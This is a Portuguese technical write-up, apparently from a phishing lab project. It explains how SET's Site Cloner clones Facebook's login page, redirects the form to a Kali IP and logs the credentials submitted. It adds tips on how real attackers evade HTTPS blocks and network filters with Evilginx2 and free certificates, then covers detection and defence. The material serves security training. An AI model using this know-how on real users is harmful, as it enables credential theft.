# Análise técnica aprofundada do ataque

## 1. O que o SET realmente faz por debaixo dos panos?

O SEToolkit é escrito em Python. Quando você escolhe "Site Cloner", ele:

- Usa `wget` ou `urllib` para baixar recursivamente a página alvo.
- Armazena o conteúdo em `/var/www/set/` ou diretório temporário.
- Substitui todas as ocorrências de `action="https://www.facebook.com/login.php"` por `action="http://<KALI_IP>/"`.
- Levanta um servidor HTTP usando `SimpleHTTPServer` (Python 2) ou `http.server` (Python 3) na porta 80.
- Adiciona um script de logging que captura todos os POSTs e os imprime no terminal.

## 2. Por que falha no mundo real (e como atacantes reais contornam)?

- **HTTPS vs HTTP:** Navegadores modernos (Chrome, Firefox) bloqueiam envios de formulários de uma página HTTP para um destino HTTP se a página original era HTTPS. Isso é Mixed Content. Atacantes reais usam:
  - Certificados Let's Encrypt gratuitos (via ngrok, serveo ou domínio próprio).
  - Ferramentas como Evilginx2, que age como proxy reverso e mantém HTTPS.
- **Filtros de segurança:** Muitas empresas bloqueiam acesso a IPs desconhecidos na porta 80. Solução: usar portas comuns como 443 (com SSL) ou 8080.

## 3. Como detectar este ataque específico?

- Usuário: verificar se a URL começa com `http://` (Facebook real é `https://`).
- Inspecionar elemento (F12) e olhar o atributo `action` do formulário – deve apontar para `facebook.com`, não um IP.
- Ferramentas: Wireshark mostra tráfego HTTP claro. Um IDS/IPS com regras para "facebook" + POST para IP não-Meta pode disparar alerta.

## 4. Conclusão para o profissional de cibersegurança

Saber fazer esse ataque é o mínimo. O valor está em:
- Entender suas limitações.
- Saber se defender (treinamento, 2FA, políticas de navegação segura).
- Conhecer as evoluções (AiTM, evilginx, phishing com OAuth).

Este projeto serve como base sólida para quem quer seguir em Red Team ou Blue Team.
```